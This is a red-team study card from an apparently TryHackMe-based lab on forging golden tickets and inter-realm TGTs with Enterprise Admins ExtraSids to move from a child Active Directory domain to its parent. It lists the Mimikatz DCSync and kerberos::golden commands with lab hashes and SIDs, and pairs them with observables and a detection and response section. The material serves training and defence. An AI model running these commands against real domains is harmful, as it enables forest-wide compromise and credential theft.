---
{"dg-publish":true,"permalink":"/cards/red-team/exploiting-domain-trusts/"}
---

~ [[cards/red-team/Exploiting Active Directory\|Exploiting Active Directory]]
## Summary
---
**What it is:** Forging Kerberos Ticket Granting Tickets (TGTs) using the KRBTGT account's password hash to gain unrestricted access to a domain, and exploiting bidirectional trust relationships between child and parent domains by injecting Enterprise Admins SID into forged Inter-Realm TGTs.

**Scope:** This note covers Golden Ticket creation using DC Sync to obtain KRBTGT hash, forging standard Golden Tickets for domain access, and forging Inter-Realm TGTs with ExtraSids to escalate privileges from child domain to parent domain by abusing transitive trust relationships.

**Prerequisites:** 
- [[Key Distribution Center\|Key Distribution Center]]
- [[cards/active-directory/Domain Trusts\|Domain Trusts]] (Parent note)
- [[Kerberos Authentication\|Kerberos Authentication]]
- Domain Admin or equivalent privileges in child domain
- Access to domain controller or ability to perform DC Sync

**Risks & Limitations:**

- Requires KRBTGT password hash (needs DA privileges or DC compromise)
- Golden Tickets are valid until KRBTGT password is reset twice
- Forged tickets may trigger detection if used carelessly
- Inter-Realm TGTs require knowledge of parent domain SIDs
- KRBTGT password reset impacts all legitimate Kerberos tickets

## How it works (2–4 lines)
The KRBTGT account is Microsoft's Kerberos implementation service account for the Key Distribution Center (KDC), which handles all Kerberos ticket requests and encrypts/signs all TGTs using its password hash shared across domain controllers. Administrators rely on KRBTGT to verify ticket authenticity when users request resource access. Attackers who obtain the KRBTGT hash can forge TGTs (Golden Tickets) that bypass the KDC entirely, impersonate any user, and exploit bidirectional trust between child and parent domains by injecting Enterprise Admins SID into the ExtraSids field of Inter-Realm TGTs, granting access to all domains in the forest.

Read first: [[cards/active-directory/Domain Trusts\|Domain Trusts]]
## Steps (red — hands on)
---
**Legend:**
- {CHILD_DOMAIN} = za.tryhackme.loc
- {PARENT_DOMAIN} = tryhackme.loc
- {CHILD_DC} = THMDC
- {PARENT_DC} = THMROOTDC
- {KRBTGT_HASH} = 16f9af38fca3ada405386b3b57366082
- {CHILD_DOMAIN_SID} = S-1-5-21-3885271727-2693558621-2658995185
- {CHILD_DC_SID} = S-1-5-21-3885271727-2693558621-2658995185-1001
- {ENTERPRISE_ADMINS_SID} = `S-1-5-21-<RootDomain>-519`

**Context:** You have now access to a Tier 0 infrastructure, if you take control of the root domain, you are now in a position to compromise all of these regional domains.

### 1. Obtain KRBTGT Password Hash via DC Sync
---

**Action:**

- Launch Mimikatz on compromised domain controller (THMSERVER2):

```C
  mimikatz.exe
```

- Enable debug privileges:

```C
  privilege::debug
```

- Perform DC Sync to extract KRBTGT password hash:

```C
  lsadump::dcsync /user:za\krbtgt
```

**Observable:**

- `mimikatz.exe` process execution
- SeDebugPrivilege enabled (Event ID 4673 if auditing enabled)
- Directory Replication Service (DRS) RPC calls to Domain Controller
- Network traffic on port 135 (RPC) and dynamic high ports
- Event ID 4662 (Operation performed on AD object) on DC - replication of sensitive attributes
- Event ID 5136 (Directory Service object modified) if detailed auditing enabled
- Unusual account accessing `CN=krbtgt` object in AD

**Extract Required Information from Output:**

1. **FQDN of the domain:**
```C
[DC] 'za.tryhackme.loc' will be the domain
```

2. **Security Identifier (SID) of the domain:**
```C
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-502
```

(Remove the RID at the end: `-502` to get domain SID: `S-1-5-21-3885271727-2693558621-2658995185`)

3. **KRBTGT NTLM hash:**

```C
Hash NTLM: 16f9af38fca3ada405386b3b57366082
```

4. **Username to impersonate:** Specify when creating Golden Ticket (typically Administrator)

### 2. Understanding Inter-Realm TGTs and ExtraSids
---

**Concept:**

**Inter-Realm TGTs** provide access to resources in other domains. To exploit the bidirectional trust relationship between child and parent domain, you forge an Inter-Realm TGT with manipulated ExtraSids.

**How Kerberos Tickets Work:**

Every user's Kerberos ticket contains:
- The user SID
- The groups the user belongs to (their group SIDs)
- What domain those SIDs belong to

This determines what access the user has.

**Normal Behavior:**

You can ONLY have group SIDs from your own domain.

Example in child domain:
- SID of `child\user`
- SIDs of child domain groups (e.g., Domain Admins of child domain)
- Does NOT contain parent domain group SIDs

**ExtraSids Field:**

The **ExtraSids** field handles cross-domain group membership legitimately in large AD environments.

**Attack Vector:**

When forging a Golden Ticket, you can inject arbitrary SIDs into ExtraSids, including SIDs from the parent domain.

**The Exploit:**

Add the SID of the **Enterprise Admins group** (from parent domain) into ExtraSids of forged ticket.

Enterprise Admins SID format:
```C
S-1-5-21--519
```

This grants you Enterprise Admin privileges across the entire forest.

### 3. Gather Required SIDs for Inter-Realm TGT
---

**Action:**

- Get SID of child domain controller (THMDC) to impersonate in forged TGT:

```C
  Get-ADComputer -Identity "THMDC"
```

![Exploiting Domain Trusts.png](/img/user/cards/red-team/images/Exploiting%20Domain%20Trusts.png)

- Get SID of Enterprise Admins group in parent domain to add as ExtraSid:

```C
  Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc
```

![Exploiting Domain Trusts-1.png](/img/user/cards/red-team/images/Exploiting%20Domain%20Trusts-1.png)

**Observable:**

- `powershell.exe` process execution
- LDAP queries to Domain Controller on port 389/636
- LDAP queries to parent domain controller (`thmrootdc.tryhackme.loc`)
- Event ID 4662 (Operation performed on AD object) on both child and parent DCs
- Network connections to parent DC from child domain machine

### 4. Forge Inter-Realm Golden Ticket with ExtraSids
---

**Action:**

- In Mimikatz, enable debug privileges:

```C
  privilege::debug
```

- Forge Golden Ticket with Enterprise Admins SID in ExtraSids and inject into current session:

```C
  kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:{KRBTGT_HASH} /sids:{ENTERPRISE_ADMINS_SID} /ptt
```

**Parameters:**
- **/user** - Username to impersonate (Administrator)
- **/domain** - FQDN of child domain
- **/sid** - SID of the account being impersonated (child DC computer account)
- **/service** - Target service (krbtgt for TGT)
- **/rc4** - KRBTGT NTLM hash obtained from DC Sync
- **/sids** - Extra SIDs to inject (Enterprise Admins SID from parent domain)
- **/ptt** - Pass-the-ticket (inject into current session immediately)

**Observable:**

- Mimikatz `kerberos::golden` command execution
- Forged TGT created in memory (not requested from KDC)
- No Event ID 4768 (TGT request) generated on DC - ticket created locally
- Ticket injected into LSASS memory
- Unusual ticket properties if inspected:
  - Lifetime longer than default (10 years vs 10 hours)
  - Encryption type may differ from domain policy
  - ExtraSids field contains foreign domain SIDs
  - No corresponding DC logs for ticket issuance

### 5. Verify Access to Child Domain
---

**Action:**

- Test access to child domain controller using forged ticket:

```C
  dir \\thmdc.za.tryhackme.loc\c$
```

**Observable:**

- SMB connection to child DC on port 445
- Kerberos authentication using forged TGT (no credential prompt)
- Event ID 4624 (Logon) on child DC:
  - Logon Type 3 (Network)
  - Account: Administrator
  - Authentication Package: Kerberos
  - Ticket shows unusual properties if logged
- Successful directory listing of administrative share `C$`
- Event ID 4672 (Special privileges assigned to new logon) - Administrator privileges
### 6. Verify Access to Parent Domain

**Action:**

- Test access to parent domain controller using forged Inter-Realm TGT with Enterprise Admins SID:

```C
  dir \\thmrootdc.tryhackme.loc\c$\
```

**Observable:**

- SMB connection to parent DC on port 445
- Kerberos authentication across trust boundary
- Event ID 4624 (Logon) on parent DC:
  - Logon Type 3 (Network)
  - Account: Administrator@za.tryhackme.loc (from child domain)
  - Authentication Package: Kerberos
  - Successful authentication with Enterprise Admin privileges
- Event ID 4672 (Special privileges assigned) - Enterprise Admin level access
- Successful directory listing of parent DC's `C$` share
- Cross-domain authentication logged (user from child accessing parent)
- Potential Event ID 4769 (Kerberos service ticket requested) with unusual SID history
## Blue - Detection & Response
---

**Key Logs:**

- Event ID 4662 (Operation performed on AD object) - DC Sync accessing KRBTGT account
- Event ID 4673 (Sensitive privilege use) - SeDebugPrivilege usage by Mimikatz
- Event ID 4624 (Logon) - Logons with unusual ticket properties or cross-domain with high privileges
- Event ID 4672 (Special privileges assigned) - Enterprise Admin privileges from child domain account
- Event ID 4768 (TGT requested) - Absence of this event when authentication occurs (Golden Ticket bypasses KDC)
- Event ID 4769 (Service ticket requested) - Tickets with ExtraSids or SID history from foreign domains
- Sysmon Event ID 1 (Process creation) - mimikatz.exe execution
- Network traffic on port 135 and dynamic RPC ports during DC Sync

**Detection Patterns:**

- DC Sync activity from non-DC computers (DRS replication from workstations/servers)
- KRBTGT account accessed by accounts other than domain controllers
- Kerberos authentication without corresponding TGT request (Event ID 4624 without 4768)
- TGT with lifetime exceeding 10 hours (Golden Tickets often forged with extended lifetime)
- ExtraSids field populated in Kerberos tickets with SIDs from parent domain
- Cross-domain authentication with Enterprise Admin privileges from non-privileged accounts
- Mimikatz process execution or in-memory detection
- SeDebugPrivilege usage by non-system processes

**High-Value Indicators:**

- Child domain account authenticating with Enterprise Admin SID in ticket
- Authentication to parent domain from child domain with no corresponding trust usage logs
- Multiple domain controllers accessed in short timeframe with same forged ticket
- Kerberos tickets with encryption type downgrade (RC4 instead of AES)
- Unusual SID history in cross-domain authentication events
- Access to sensitive resources (DCs, CA servers) immediately after DC Sync activity

**Quick Response:**

1. Reset KRBTGT password TWICE (24 hour gap) to invalidate all Golden Tickets
2. Investigate DC Sync source - identify and isolate compromised system
3. Review all Enterprise Admin and Domain Admin group memberships across forest
4. Hunt for Mimikatz artifacts and memory dumps on suspected systems
5. Enable advanced Kerberos auditing and DC Sync monitoring
6. Review all cross-domain access in past 30 days for suspicious patterns
7. Force re-authentication of all privileged accounts
8. Rebuild compromised domain controllers from known-good backups
